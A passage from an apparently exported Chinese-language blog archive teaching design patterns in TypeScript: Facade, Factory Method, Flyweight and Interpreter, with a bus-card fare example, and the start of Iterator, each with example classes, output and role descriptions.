<h5 id="Square-ts-正方形类"><a href="#Square-ts-正方形类" class="headerlink" title="Square.ts 正方形类"></a>Square.ts 正方形类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line"></span><br><span class="line">export default class Square implements Shape &#123;</span><br><span class="line"></span><br><span class="line">    public draw(): void &#123;</span><br><span class="line">        console.log(&quot;Square::draw()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Circle-ts-圆形类"><a href="#Circle-ts-圆形类" class="headerlink" title="Circle.ts 圆形类"></a>Circle.ts 圆形类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line"></span><br><span class="line">export default class Circle implements Shape &#123;</span><br><span class="line"></span><br><span class="line">    public draw(): void &#123;</span><br><span class="line">        console.log(&quot;Circle::draw()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="ShapeMaker-ts-图形绘制门面类"><a href="#ShapeMaker-ts-图形绘制门面类" class="headerlink" title="ShapeMaker.ts 图形绘制门面类"></a>ShapeMaker.ts 图形绘制门面类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Shape &#125; from &quot;.&#x2F;Shape&quot;;</span><br><span class="line">import Circle from &quot;.&#x2F;Circle&quot;;</span><br><span class="line">import Rectangle from &quot;.&#x2F;Rectangle&quot;;</span><br><span class="line">import Square from &quot;.&#x2F;Square&quot;;</span><br><span class="line"></span><br><span class="line">export default class ShapeMaker &#123;</span><br><span class="line">    private circle: Shape;</span><br><span class="line">    private rectangle: Shape;</span><br><span class="line">    private square: Shape;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.circle &#x3D; new Circle();</span><br><span class="line">        this.rectangle &#x3D; new Rectangle();</span><br><span class="line">        this.square &#x3D; new Square();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public drawCircle(): void &#123;&#x2F;&#x2F;绘制圆形</span><br><span class="line">        this.circle.draw();</span><br><span class="line">    &#125;</span><br><span class="line">    public drawRectangle(): void &#123;&#x2F;&#x2F;绘制矩形</span><br><span class="line">        this.rectangle.draw();</span><br><span class="line">    &#125;</span><br><span class="line">    public drawSquare(): void &#123;&#x2F;&#x2F;绘制正方形</span><br><span class="line">        this.square.draw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ShapeMaker from &quot;.&#x2F;ShapeMaker&quot;;</span><br><span class="line"></span><br><span class="line">const shapeMaker: ShapeMaker &#x3D; new ShapeMaker();</span><br><span class="line"></span><br><span class="line">shapeMaker.drawCircle();</span><br><span class="line">shapeMaker.drawRectangle();</span><br><span class="line">shapeMaker.drawSquare();      </span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Circle::draw()</span><br><span class="line">Rectangle::draw()</span><br><span class="line">Square::draw()</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-02e9be36dbdd957c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Facade （门面）<br>Facde角色向系统外部提供统一接口。示例中ShapeMaker类扮演该角色</li>
<li>其他角色<br>Facade角色调用这些角色进行工作，但是其他角色各自完成自己的工作，并不知道Facade角色，示例中的Circle、Rectangle、Square扮演该角色</li>
<li>Client（请求角色）<br>负责调用Facade角色，并不包括在Facade模式中</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Factory-Method(工厂模式)</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Factory-Method(%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F)/</url>
    <content><![CDATA[<h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><blockquote>
<p>这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。<br>在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p>
</blockquote>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li><strong>意图：</strong>定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。</li>
<li><strong>何时使用：</strong>我们明确地计划不同条件下创建不同实例时。</li>
<li><strong>如何解决：</strong>让其子类实现工厂接口，返回的也是一个抽象的产品。</li>
<li><strong>关键代码：</strong>创建过程在其子类执行。</li>
<li><strong>优点：</strong><blockquote>
<ol>
<li>一个调用者想创建一个对象，只要知道其名称就可以了。  </li>
<li>扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。 </li>
<li>屏蔽产品的具体实现，调用者只关心产品的接口。</li>
</ol>
</blockquote>
</li>
<li><strong>缺点：</strong>每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。<h3 id="Product类："><a href="#Product类：" class="headerlink" title="Product类："></a>Product类：</h3>用来表示”产品“的类，声明了use的抽象方法。use的实现交给子类<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default abstract class Product &#123;</span><br><span class="line">    public abstract use(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Factory类"><a href="#Factory类" class="headerlink" title="Factory类:"></a>Factory类:</h3>使用<a href="https://www.jianshu.com/p/61549520cddc">Template Method</a>模式，声明了creatProduct（生产产品）和registerProduct（注册产品）的抽象方法。具体实现交给子类<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Product from &#39;.&#x2F;Product&#39;;</span><br><span class="line">export default abstract class Factory &#123;</span><br><span class="line">    public create(owner: String): Product &#123;</span><br><span class="line">        const p: Product &#x3D; this.creatProduct(owner);</span><br><span class="line">        this.registerProduct(p);</span><br><span class="line">        return p;</span><br><span class="line">    &#125;</span><br><span class="line">    protected abstract creatProduct(owner: String): Product;</span><br><span class="line">    protected abstract registerProduct(Product: Product): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="IDCard类："><a href="#IDCard类：" class="headerlink" title="IDCard类："></a>IDCard类：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Product from &#39;.&#x2F;Product&#39;;</span><br><span class="line">export default class IDCard extends Product &#123;</span><br><span class="line">    private owner: String;</span><br><span class="line">    constructor(owner: String) &#123;</span><br><span class="line">        super();</span><br><span class="line">        console.log(&#96;制作$&#123;owner&#125;的ID卡！&#96;);</span><br><span class="line">        this.owner &#x3D; owner;</span><br><span class="line">    &#125;</span><br><span class="line">    public use(): void &#123;</span><br><span class="line">        console.log(&#96;使用$&#123;this.owner&#125;的ID卡&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">    public getOwner(): String &#123;</span><br><span class="line">        return this.owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="IDCardFactory类："><a href="#IDCardFactory类：" class="headerlink" title="IDCardFactory类："></a>IDCardFactory类：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Factory from &#39;.&#x2F;Factory&#39;;</span><br><span class="line">import Product from &#39;.&#x2F;Product&#39;;</span><br><span class="line">import IDCard from &#39;.&#x2F;IDCard&#39;;</span><br><span class="line">export default class IDCardFactory extends Factory &#123;</span><br><span class="line">    private owners: Array&lt;String&gt; &#x3D; new Array();</span><br><span class="line">    protected creatProduct(owner: String): Product &#123;</span><br><span class="line">        return new IDCard(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    protected registerProduct(product: Product) &#123;</span><br><span class="line">        &#x2F;&#x2F;转换product类型为IDCard</span><br><span class="line">        this.owners.push((product as IDCard).getOwner());</span><br><span class="line">    &#125;</span><br><span class="line">    public getOwners(): Array&lt;String&gt; &#123;</span><br><span class="line">        return this.owners;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import IDCardFactory from &#39;.&#x2F;IDCardFactory&#39;;</span><br><span class="line">import Product from &#39;.&#x2F;Product&#39;;</span><br><span class="line"></span><br><span class="line">const factory &#x3D; new IDCardFactory();</span><br><span class="line">const card1: Product &#x3D; factory.create(&quot;小明&quot;);</span><br><span class="line">const card2: Product &#x3D; factory.create(&quot;小红&quot;);</span><br><span class="line">const card3: Product &#x3D; factory.create(&quot;小刚&quot;);</span><br><span class="line"></span><br><span class="line">card1.use();</span><br><span class="line">card2.use();</span><br><span class="line">card3.use();</span><br><span class="line">console.log(factory.getOwners());</span><br></pre></td></tr></table></figure>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">制作小明的ID卡！</span><br><span class="line">制作小红的ID卡！</span><br><span class="line">制作小刚的ID卡！</span><br><span class="line">使用小明的ID卡</span><br><span class="line">使用小红的ID卡</span><br><span class="line">使用小刚的ID卡</span><br><span class="line">[ &#39;小明&#39;, &#39;小红&#39;, &#39;小刚&#39; ]</span><br></pre></td></tr></table></figure>
<h3 id="结构："><a href="#结构：" class="headerlink" title="结构："></a>结构：</h3></li>
</ul>
<p><strong>Product(产品)：</strong>属于框架这一方，是抽象类，定义在Factory Method模式中生产的那些实例所持有的接口（API），具体由子类ConcreteProduct角色决定。<br><strong>Creator(创建者)：</strong>属于框架这一方，负责生产Product角色的抽闲类，具体处理由子类ConcreteCreator角色决定<br><strong>ConcreteProduct(具体产品)：</strong>属于具体加工方，决定了具体的产品。<br><strong>ConcreteCreator(具体的创造者)：</strong>属于具体加工方，负责生产具体的产品</p>
<h3 id="类图："><a href="#类图：" class="headerlink" title="类图："></a>类图：</h3><p><img src="https://upload-images.jianshu.io/upload_images/10024246-378922e9df56e360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Factory Method模式类图"></p>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Flyweight-Pattern(享元模式)</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Flyweight-Pattern(%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F)/</url>
    <content><![CDATA[<p>**享元模式（Flyweight Pattern）:**通过尽量共享示例来避免new出实例，以减少内存占用和提高性能。这种类型的设计模式属于结构型模式。<br>系统只使用少量的对象，而这些对象都很相似，状态变化很小，可以实现对象的多次复用。由于享元模式要求能够共享的对象必须是细粒度对象，因此它又称为轻量级模式，它是一种对象结构型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>运用共享技术有效地支持大量细粒度的对象。</li>
<li><strong>主要解决：</strong>在有大量对象时，有可能会造成内存溢出，我们把其中共同的部分抽象出来，如果有相同的业务请求，直接返回在内存中已有的对象，避免重新创建。</li>
<li><strong>应用实例：</strong><br>1、JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面。<br>2、数据库的数据池。</li>
<li><strong>优点：</strong><br>1、极大减少内存中相似或相同对象数量，节约系统资源，提供系统性能<br>2、提高效率，由于创建对象的数量减少，所以对系统内存的需求也减小，使得速度更快，效率更高。<br>3、享元模式中的外部状态相对独立，且不影响内部状态</li>
<li><strong>缺点：</strong>为了使对象可以共享，需要将享元对象的部分状态外部化，分离内部状态和外部状态，使程序逻辑复杂</li>
<li><strong>使用场景：</strong> 1、系统有大量相似对象。 2、需要缓冲池的场景。<blockquote>
<p>注意事项： 1、注意划分外部状态和内部状态，否则可能会引起线程安全问题。 2、这些类必须有一个工厂对象加以控制。</p>
</blockquote>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="Employer-ts-雇员抽象类"><a href="#Employer-ts-雇员抽象类" class="headerlink" title="Employer.ts 雇员抽象类"></a>Employer.ts 雇员抽象类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default abstract class Employer&#123;</span><br><span class="line">    protected  _company:string &#x3D; &quot;COMPANY&quot;;&#x2F;&#x2F;公共属性</span><br><span class="line">    protected  _companyAddress:string &#x3D; &quot;ADDRESS&quot;;&#x2F;&#x2F;公共属性</span><br><span class="line"></span><br><span class="line">    public abstract  SetPropertity(name:string, age:string):void;</span><br><span class="line">    public abstract  ShowInformation():void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="CreatEmployer-ts-创建一个具体雇员的类"><a href="#CreatEmployer-ts-创建一个具体雇员的类" class="headerlink" title="CreatEmployer.ts 创建一个具体雇员的类"></a>CreatEmployer.ts 创建一个具体雇员的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Employer from &quot;.&#x2F;Employer&quot;;</span><br><span class="line"></span><br><span class="line">export default class CreatEmployer extends Employer &#123;</span><br><span class="line">    private _name: string; &#x2F;&#x2F;特有属性</span><br><span class="line">    private _age: string;</span><br><span class="line">    private _id: string &#x3D; &quot;01&quot;;</span><br><span class="line">    constructor(id: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this._id &#x3D; id;</span><br><span class="line">    &#125;</span><br><span class="line">    public SetPropertity(name: string, age: string): void &#123;</span><br><span class="line">        this._age &#x3D; age;</span><br><span class="line">        this._name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">    public ShowInformation(): void &#123;</span><br><span class="line">        console.log(</span><br><span class="line">            &#96;company:$&#123;this._company&#125; companyAddress:$&#123;this._companyAddress&#125; name:$&#123;this._name&#125; id:$&#123;this._id&#125;  age:$&#123;this._age&#125;&#96;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="EmployerFactory-ts-雇员工厂"><a href="#EmployerFactory-ts-雇员工厂" class="headerlink" title="EmployerFactory.ts 雇员工厂"></a>EmployerFactory.ts 雇员工厂</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Employer from &quot;.&#x2F;Employer&quot;;</span><br><span class="line">import CreatEmployer from &quot;.&#x2F;CreatEmployer&quot;;</span><br><span class="line"></span><br><span class="line">export default class EmployerFactory &#123;</span><br><span class="line">    private static emploryerFactory: EmployerFactory;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取唯一对象</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static getEmployerFactory(): EmployerFactory &#123;</span><br><span class="line">        &#x2F;&#x2F;判断士兵对象是否存在</span><br><span class="line">        if (this.emploryerFactory &#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F;不存在就创建新的对象</span><br><span class="line">            this.emploryerFactory &#x3D; new EmployerFactory();</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;返回对象</span><br><span class="line">        return this.emploryerFactory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public GetEmployer(id: string): Employer &#123;</span><br><span class="line">        let employer: Employer &#x3D; new CreatEmployer(id);</span><br><span class="line">        return employer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Employer from &quot;.&#x2F;Employer&quot;;</span><br><span class="line">import EmployerFactory from &quot;.&#x2F;EmployerFactory&quot;;</span><br><span class="line"></span><br><span class="line">const employer1: Employer &#x3D; EmployerFactory.getEmployerFactory().GetEmployer(</span><br><span class="line">    &quot;01&quot;</span><br><span class="line">);</span><br><span class="line">employer1.SetPropertity(&quot;jasen&quot;, &quot;24&quot;);</span><br><span class="line">employer1.ShowInformation();</span><br><span class="line"></span><br><span class="line">const employer2: Employer &#x3D; EmployerFactory.getEmployerFactory().GetEmployer(</span><br><span class="line">    &quot;02&quot;</span><br><span class="line">);</span><br><span class="line">employer2.SetPropertity(&quot;tt&quot;, &quot;44&quot;);</span><br><span class="line">employer2.ShowInformation();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">company:COMPANY companyAddress:ADDRESS name:jasen id:01  age:24</span><br><span class="line">company:COMPANY companyAddress:ADDRESS name:tt id:02  age:44</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><img src="https://upload-images.jianshu.io/upload_images/10024246-1c81c144830027ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ul>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li><p><strong>Flyweight（抽象享元类）</strong><br>通常是接口或抽象类，抽象享元类中声明了具体享元类公共方法，这些方法可以向外界提供享元对象的内部数据（内部状态），同时也可以通过这些方法来设置外部数据（外部状态）</p>
</li>
<li><p><strong>ConcreteFlyweight（具体享元类）</strong><br>继承抽象享元类，在具体享元类中为内部状态提供存储空间。通常可以结合单例模式来设计具体享元类，为每一个具体享元类提供唯一的享元对象</p>
</li>
<li><p><strong>UnshareConcreteFlyweight（非分享具体享元类）</strong><br>并不是所有的具体享元类都需要被共享，不能被共享的子类可以设计为非共享具体享元类，当需要一个非共享具体享元类的对象时可以直接通过实例化创建</p>
</li>
<li><p><strong>FlyweightFactory（享元工厂类）</strong><br>创建并管理享元对象，将各种具体享元类存储到一个享元池中，享元池一般为“键值对”集合，可以结合工厂模式进行设计。当用户请求一个具体享元对象时，享元池中如果保存的有就直接返回给用户，如果没有就创建该享元对象返回给用户并存储到享元池中</p>
<h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2></li>
<li><p>享元模式和工厂模式、单例模式<br>在区分出不同种类的外部状态后，创建新对象时需要选择不同种类的共享对象，这时就可以使用工厂模式来提供共享对象，在共享对象的维护上，经常会采用单例模式来提供单实例的共享对象。</p>
</li>
<li><p>享元模式和组合模式<br>在使用工厂模式来提供共享对象时，比如某些时候共享对象中的某些状态就是对象不需要的，可以引入组合模式来提升自定义共享对象的自由度，对共享对象的组成部分进一步归类、分层，来实现更复杂的多层次对象结构，当然系统也会更难维护。</p>
</li>
<li><p>享元模式和策略模式<br>策略模式中的策略属于一系列功能单一、细粒度的细粒度对象，可以作为目标对象来考虑引入享元模式进行优化，但是前提是这些策略是会被频繁使用的，如果不经常使用，就没有必要了。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Interpreter-Pattern(解释器模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Interpreter-Pattern(%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>解释器模式（Interpreter Pattern）</strong>：提供了评估语言的语法或表达式的方式，它属于行为型模式。这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。</li>
<li><strong>主要解决：</strong>对于一些固定文法构建一个解释句子的解释器。</li>
<li><strong>何时使用：</strong>如果一种特定类型的问题发生的频率足够高，那么可能就值得将该问题的各个实例表述为一个简单语言中的句子。这样就可以构建一个解释器，该解释器通过解释这些句子来解决该问题。</li>
<li><strong>应用实例：</strong>编译器、运算表达式计算。</li>
<li><strong>优点：</strong><br>1、可扩展性比较好，灵活。<br>2、增加了新的解释表达式的方式。<br>3、易于实现简单文法。</li>
<li><strong>缺点：</strong><br>1、可利用场景比较少。<br>2、对于复杂的文法比较难维护。<br>3、解释器模式会引起类膨胀。<br>4、解释器模式采用递归调用方法。</li>
<li><strong>使用场景：</strong><br>1、可以将一个需要解释执行的语言中的句子表示为一个抽象语法树。<br>2、一些重复出现的问题可以用一种简单的语言来进行表达。<br>3、一个简单语法需要解释的场景。<br>4、这种模式被用在 SQL 解析、符号处理引擎等。<br>5、EL表达式式的处理<br>6、正则表达式解释器<br>7、数学表达式解析器</li>
</ul>
<blockquote>
<p>注意事项：是一种不常用的设计模式 – 用于描述如何构成一个简单的语言解释器，主要用于使用面向对象语言开发的 编译器和解释器设计。<br>当我们需要开发一种新的语言时，可以考虑使用解释器模式。<br> 尽量不要使用解释器模式，后期维护会有很大麻烦。</p>
</blockquote>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><blockquote>
<p>用解释器模式设计一个“韶粵通”公交车卡的读卡器程序。<br>说明：假如“韶粵通”公交车读卡器可以判断乘客的身份，如果是“韶关”或者“广州”的“老人” “妇女”“儿童”就可以免费乘车，其他人员乘车一次扣 2 元。<br>设计其文法规则如下。<br><expression> ::= <city>的<person><br><city> ::= 韶关|广州<br><person> ::= 老人|妇女|儿童</p>
</blockquote>
<h5 id="Expression-ts-抽象表达式类"><a href="#Expression-ts-抽象表达式类" class="headerlink" title="Expression.ts //抽象表达式类"></a>Expression.ts //抽象表达式类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface Expression &#123;</span><br><span class="line">    interpret(info: string): boolean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="TerminalExpression-ts-终结符表达式类"><a href="#TerminalExpression-ts-终结符表达式类" class="headerlink" title="TerminalExpression.ts //终结符表达式类"></a>TerminalExpression.ts //终结符表达式类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Expression &#125; from &quot;.&#x2F;Expression&quot;;</span><br><span class="line"></span><br><span class="line">export default class TerminalExpression implements Expression &#123;</span><br><span class="line">    private set &#x3D; new Array&lt;string&gt;();</span><br><span class="line">    constructor(data: string[]) &#123;</span><br><span class="line">        for (let i &#x3D; 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            this.set.push(data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public interpret(info: string): boolean &#123;</span><br><span class="line">        if (this.set.indexOf(info) &gt;&#x3D; 0) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="AndExpression-ts-非终结符表达式类"><a href="#AndExpression-ts-非终结符表达式类" class="headerlink" title="AndExpression.ts 非终结符表达式类"></a>AndExpression.ts 非终结符表达式类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Expression &#125; from &quot;.&#x2F;Expression&quot;;</span><br><span class="line"></span><br><span class="line">export default class AndExpression implements Expression &#123;</span><br><span class="line">    private city: Expression;</span><br><span class="line">    private person: Expression;</span><br><span class="line">    constructor(city: Expression, person: Expression) &#123;</span><br><span class="line">        this.city &#x3D; city;</span><br><span class="line">        this.person &#x3D; person;</span><br><span class="line">    &#125;</span><br><span class="line">    public interpret(info: string): boolean &#123;</span><br><span class="line">        const s &#x3D; info.split(&quot;的&quot;);</span><br><span class="line">        return this.city.interpret(s[0]) &amp;&amp; this.person.interpret(s[1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Context-ts-环境类"><a href="#Context-ts-环境类" class="headerlink" title="Context.ts //环境类"></a>Context.ts //环境类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import TerminalExpression from &quot;.&#x2F;TerminalExpression&quot;;</span><br><span class="line">import &#123; Expression &#125; from &quot;.&#x2F;Expression&quot;;</span><br><span class="line">import AndExpression from &quot;.&#x2F;AndExpression&quot;;</span><br><span class="line"></span><br><span class="line">export default class Context &#123;</span><br><span class="line">    private citys &#x3D; [&quot;韶关&quot;, &quot;广州&quot;];</span><br><span class="line">    private persons &#x3D; [&quot;老人&quot;, &quot;妇女&quot;, &quot;儿童&quot;];</span><br><span class="line">    private cityPerson: Expression;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        const city: Expression &#x3D; new TerminalExpression(this.citys);</span><br><span class="line">        const person: Expression &#x3D; new TerminalExpression(this.persons);</span><br><span class="line">        this.cityPerson &#x3D; new AndExpression(city, person);</span><br><span class="line">    &#125;</span><br><span class="line">    public freeRide(info: string): void &#123;</span><br><span class="line">        const ok &#x3D; this.cityPerson.interpret(info);</span><br><span class="line">        if (ok) &#123;</span><br><span class="line">            console.log(&quot;您是&quot; + info + &quot;，您本次乘车免费！&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(info + &quot;，您不是免费人员，本次乘车扣费2元！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Context from &quot;.&#x2F;Context&quot;;</span><br><span class="line"></span><br><span class="line">const bus: Context &#x3D; new Context();</span><br><span class="line">bus.freeRide(&quot;韶关的老人&quot;);</span><br><span class="line">bus.freeRide(&quot;韶关的年轻人&quot;);</span><br><span class="line">bus.freeRide(&quot;广州的妇女&quot;);</span><br><span class="line">bus.freeRide(&quot;广州的儿童&quot;);</span><br><span class="line">bus.freeRide(&quot;山东的儿童&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">您是韶关的老人，您本次乘车免费！</span><br><span class="line">韶关的年轻人，您不是免费人员，本次乘车扣费2元！</span><br><span class="line">您是广州的妇女，您本次乘车免费！</span><br><span class="line">您是广州的儿童，您本次乘车免费！</span><br><span class="line">山东的儿童，您不是免费人员，本次乘车扣费2元！</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-2f43bf4016b5d82f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li><strong>AbstractExpression：</strong>(抽象表达式)<br>声明一个抽象的解释操作，这个接口被抽象语法树中所有的节点所共享；定义语法树节点的共同接口。</li>
<li><strong>TernimalExpression：</strong>（终结符表达式）<br>一个句子中的每个终结符需要该类的一个实例，它实现与文法中的终结符相关联的解释操作；</li>
<li><strong>NonternimalExpression：</strong>（非终结符表达式）<ul>
<li>对于文法中的每一条规则都需要一个NonternimalExpression类；</li>
<li>为文法中的的每个符号都维护一个AbstractExpression类型的实例变量；</li>
<li>为文法中的非终结符实现解释操作，在实现时，一般要递归地调用表示文法符号的那些对象的解释操作；</li>
</ul>
</li>
<li><strong>Context：</strong>（上下文）<br>包含解释器之外的一些必要信息；</li>
<li><strong>Client：</strong>（请求者）<br>构建一个需要进行解释操作的文法句子，然后调用解释操作进行解释。<h2 id="执行时序"><a href="#执行时序" class="headerlink" title="执行时序"></a>执行时序</h2>实际进行解释时，按照以下时序进行的：<br>1、Client构建一个句子，它是NonterminalExpression和TerminalExpression的实例的一个抽象语法树，然后初始化上下文并调用解释操作；<br>2、每一非终结符表达式节点定义相应子表达式的解释操作。而各终结符表达式的解释操作构成了递归的基础；<br>3、每一节点的解释操作用上下文来存储和访问解释器的状态</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Iterator模式</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Iterator%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>将（Book）放置到书架（BookShelf）中，并将书名按顺序显示</p>
<h2 id="接口："><a href="#接口：" class="headerlink" title="接口："></a>接口：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Book from &quot;.&#x2F;Book&quot;;</span><br><span class="line">&#x2F;&#x2F;Aggregate接口是所要遍历的集合的接口</span><br><span class="line">export interface Aggregate &#123;</span><br><span class="line">    bookIterator: BookIterator;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;Iterator接口，用于遍历集合中的元素</span><br><span class="line">export interface BookIterator &#123;</span><br><span class="line">    hasNext(): boolean;&#x2F;&#x2F;是否有下一个</span><br><span class="line">    next(): Book;&#x2F;&#x2F;获取下一个元素</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
